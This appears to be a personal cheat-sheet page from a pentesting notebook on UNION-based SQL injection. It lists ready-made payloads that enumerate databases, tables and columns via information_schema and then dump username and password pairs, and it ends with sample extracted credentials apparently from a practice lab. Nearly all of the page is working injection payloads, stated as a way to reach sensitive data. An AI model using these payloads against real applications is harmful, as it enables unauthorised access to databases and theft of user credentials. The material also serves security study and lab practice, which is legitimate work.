# Listing db, table and columns

## Listing databases

IMPORTANT: Group\_concat() is optional, but it allows that if there is more than one DB,table or column to print it all in a single row, otherwise, only first data will be printed

' UNION select group\_concat(schema\_name), NULL from information\_schema.schemata-- -

<figure><img src="../../.gitbook/assets/2024-02-15 07_46_48-kali-linux-2022.4-virtualbox-amd64 [Corriendo] - Oracle VM VirtualBox _ 1.png" alt=""><figcaption></figcaption></figure>

The last command dumps all databases, we'll know try to enumerate each one of those DB's till we find some sensitive data like users or passwords.

## Listing tables:

' UNION select table\_name, NULL from information\_schema.tables where table\_schema = 'insert table name'-- -

or&#x20;

' UNION select group\_concat(table\_name), NULL from information\_schema.tables where table\_schema = 'insert table name'--&#x20;

## Listing all the tables

' union select table\_name, NULL from information\_schema.tables-- -

## Listing columns:

' UNION select NULL, column\_name from information\_schema.columns where table\_schema='DB' and table\_name='table'-- -'

<figure><img src="../../.gitbook/assets/enumerating columns sql.png" alt=""><figcaption></figcaption></figure>

## Listing data:

## Option#1

\
' union select username,password from (table name without parenthesis)-- -

## Option 2

' union select NULL,group\_concat(username,';',password) from (table name without parenthesis)-- -

<figure><img src="../../.gitbook/assets/2024-02-15 13_21_28-.png" alt=""><figcaption></figcaption></figure>

## Option 3

' UNION SELECT NULL,username || '\~' || password FROM (table name without parenthesis)--

## Result:

administrator\~s3cure\
wiener\~peter\
carlos\~montoya
